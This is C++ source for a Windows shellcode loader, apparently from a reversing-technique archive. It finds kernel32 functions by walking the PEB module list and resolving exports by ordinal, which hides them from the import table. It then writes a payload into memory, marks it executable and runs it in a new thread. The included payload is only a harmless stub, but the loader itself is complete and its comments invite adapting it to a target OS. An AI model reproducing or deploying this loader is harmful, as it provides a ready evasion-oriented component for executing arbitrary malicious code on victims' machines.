/*
    Shellcode Loader
    Archive of Reversing.ID

    Resolve function by walking PEB module list and PE export table.
    Function is identified by DLL name (BaseDllName) and export ordinal.

Compile:
    $ cl.exe /nologo /Ox /MT /W0 /GS- /DNDEBUG /Tpcode.cpp

Technique:
    - access:       manual PE export walk by ordinal (PEB module list)
    - allocation:   VirtualAlloc
    - writing:      RtlMoveMemory
    - permission:   VirtualProtect
    - execution:    CreateThread

Note:
    - resolution by ordinal is done on module level, should resolve the module first.
    - the example ordinals below are from dumpbin on Windows 7 SP1 x64 kernel32.dll
*/

#include <windows.h>
#include <stdint.h>

/* ========= PEB / loader structures ========= */
typedef struct _MY_UNICODE_STRING {
    USHORT  Length;
    USHORT  MaximumLength;
    PWSTR   Buffer;
} MY_UNICODE_STRING;

typedef struct _MY_LDR_ENTRY {
    LIST_ENTRY        InLoadOrderLinks;
    LIST_ENTRY        InMemoryOrderLinks;
    LIST_ENTRY        InInitializationOrderLinks;
    PVOID             DllBase;
    PVOID             EntryPoint;
    ULONG             SizeOfImage;
    MY_UNICODE_STRING FullDllName;
    MY_UNICODE_STRING BaseDllName;
} MY_LDR_ENTRY, *PMY_LDR_ENTRY;

typedef struct _MY_PEB_LDR_DATA {
    ULONG       Length;
    BOOL        Initialized;
    PVOID       SsHandle;
    LIST_ENTRY  InLoadOrderModuleList;
    LIST_ENTRY  InMemoryOrderModuleList;
    LIST_ENTRY  InInitializationOrderModuleList;
} MY_PEB_LDR_DATA, *PMY_PEB_LDR_DATA;

/* ========= function signatures ========= */
typedef LPVOID WINAPI VirtualAlloc_t(LPVOID, SIZE_T, DWORD, DWORD);
typedef BOOL   WINAPI VirtualProtect_t(LPVOID, SIZE_T, DWORD, PDWORD);
typedef BOOL   WINAPI VirtualFree_t(LPVOID, SIZE_T, DWORD);
typedef HANDLE WINAPI CreateThread_t(LPSECURITY_ATTRIBUTES, SIZE_T, LPTHREAD_START_ROUTINE, LPVOID, DWORD, LPDWORD);
typedef DWORD  WINAPI WaitForSingleObject_t(HANDLE, DWORD);

typedef VirtualAlloc_t        FAR * pVirtualAlloc;
typedef VirtualProtect_t      FAR * pVirtualProtect;
typedef VirtualFree_t         FAR * pVirtualFree;
typedef CreateThread_t        FAR * pCreateThread;
typedef WaitForSingleObject_t FAR * pWaitForSingleObject;


/* =================== wide compare and resolvers =================== */

static wchar_t wchar_lower (wchar_t c)
{
    if (c >= L'A' && c <= L'Z')
        return c + (L'a' - L'A');
    return c;
}

/*
    Case-insensitive wide string compare.
    No CRT or loader APIs used.
*/
static BOOL wchar_equal (const wchar_t * a, const wchar_t * b)
{
    while (*a && *b)
    {
        if (wchar_lower (*a) != wchar_lower (*b))
            return FALSE;
        a++;
        b++;
    }
    return *a == *b;
}

/*
    Resolve the module by name.

    Walk PEB->Ldr->InMemoryOrderModuleList and return DllBase of the
    module whose BaseDllName matches target_dll. 
    
    Args:
        target_dll:   name of the module to search for

    Returns:
        base address of the module if found, otherwise NULL
*/
static PVOID resolve_module (const wchar_t * target_dll)
{
    PMY_PEB_LDR_DATA ldr;
    PLIST_ENTRY      list;
    PLIST_ENTRY      entry;

#ifdef _WIN64
    ldr = *(PMY_PEB_LDR_DATA *) (__readgsqword (0x60) + 0x18);
#else
    ldr = *(PMY_PEB_LDR_DATA *) (__readfsdword (0x30) + 0x0C);
#endif

    list  = &ldr->InMemoryOrderModuleList;
    entry = list->Flink;

    while (entry != list)
    {
        PMY_LDR_ENTRY mod = CONTAINING_RECORD (entry, MY_LDR_ENTRY, InMemoryOrderLinks);

        if (mod->DllBase != NULL && mod->BaseDllName.Buffer != NULL)
        {
            if (wchar_equal (mod->BaseDllName.Buffer, target_dll))
                return mod->DllBase;
        }
        entry = entry->Flink;
    }
    return NULL;
}

/*
    Resolve an export by ordinal from a single module image base.

    index = ordinal - exp->Base; returns AddressOfFunctions[index].

    Args:
        base:           base address of the module (HMODULE / DllBase)
        ordinal:        ordinal of the function to search for

    Returns:
        address of the function if found, otherwise NULL

*/
static FARPROC resolve_ordinal (PVOID base, WORD ordinal)
{
    PBYTE                   image = (PBYTE) base;
    PIMAGE_DOS_HEADER       dos   = (PIMAGE_DOS_HEADER) image;
    PIMAGE_NT_HEADERS       nt    = (PIMAGE_NT_HEADERS) (image + dos->e_lfanew);
    DWORD                   exp_rva;
    PIMAGE_EXPORT_DIRECTORY exp;
    DWORD  * funcs;
    DWORD    index;

    // get the RVA of the export table
    exp_rva = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
    if (exp_rva == 0)
        return NULL;

    // walk the export table
    exp   = (PIMAGE_EXPORT_DIRECTORY) (image + exp_rva);
    funcs = (DWORD *) (image + exp->AddressOfFunctions);

    index = ordinal - exp->Base;
    if (index >= exp->NumberOfFunctions)
        return NULL;

    return (FARPROC) (image + funcs[index]);
}

/*
    A wrapper function to resolve the function by DLL name and export ordinal.

    Locate the module via PEB then indexes its export table.

    Args:
        target_dll:   name of the module to search for
        ordinal:      ordinal of the function to search for

    Returns:
        address of the function if found, otherwise NULL
*/
static FARPROC resolve_func_by_ordinal (const wchar_t * target_dll, WORD ordinal)
{
    PVOID base = resolve_module (target_dll);
    if (base == NULL)
        return NULL;
    return resolve_ordinal (base, ordinal);
}


int main ()
{
    void *  runtime     = NULL;
    BOOL    retval;
    HANDLE  h_thread;
    DWORD   old_protect = 0;

    // shellcode storage in stack
    uint8_t     payload []  = { 0x90, 0x90, 0xCC, 0xC3 };
    uint32_t    payload_len = 4;

    // function pointers resolved at runtime
    pVirtualAlloc           fn_VirtualAlloc;
    pVirtualProtect         fn_VirtualProtect;
    pVirtualFree            fn_VirtualFree;
    pCreateThread           fn_CreateThread;
    pWaitForSingleObject    fn_WaitForSingleObject;

    PVOID kernel32;

    // ordinals from: dumpbin /exports C:\Windows\System32\kernel32.dll
    // reference: Windows 7 SP1 x64 (6.1.7600) — update for your target OS
    constexpr WORD ord_VirtualAlloc        = 1273;
    constexpr WORD ord_VirtualProtect      = 1279;
    constexpr WORD ord_VirtualFree         = 1276;
    constexpr WORD ord_CreateThread        = 181;
    constexpr WORD ord_WaitForSingleObject = 1289;

    // resolve module base then each function by export ordinal
    kernel32               = resolve_module (L"kernel32.dll");
    fn_VirtualAlloc        = (pVirtualAlloc)        resolve_ordinal (kernel32, ord_VirtualAlloc);
    fn_VirtualProtect      = (pVirtualProtect)      resolve_ordinal (kernel32, ord_VirtualProtect);
    fn_VirtualFree         = (pVirtualFree)         resolve_ordinal (kernel32, ord_VirtualFree);
    fn_CreateThread        = (pCreateThread)        resolve_ordinal (kernel32, ord_CreateThread);
    fn_WaitForSingleObject = (pWaitForSingleObject) resolve_ordinal (kernel32, ord_WaitForSingleObject);

    // allocate memory buffer for payload as READ-WRITE (no executable)
    runtime = fn_VirtualAlloc (0, payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    // copy payload to the buffer
    RtlMoveMemory (runtime, payload, payload_len);

    // make buffer executable (R-X)
    retval = fn_VirtualProtect (runtime, payload_len, PAGE_EXECUTE_READ, &old_protect);
    if (retval != 0)
    {
        h_thread = fn_CreateThread (0, 0, (LPTHREAD_START_ROUTINE) runtime, 0, 0, 0);
        fn_WaitForSingleObject (h_thread, -1);
    }

    // deallocate the space
    fn_VirtualFree (runtime, payload_len, MEM_RELEASE);

    return 0;
}
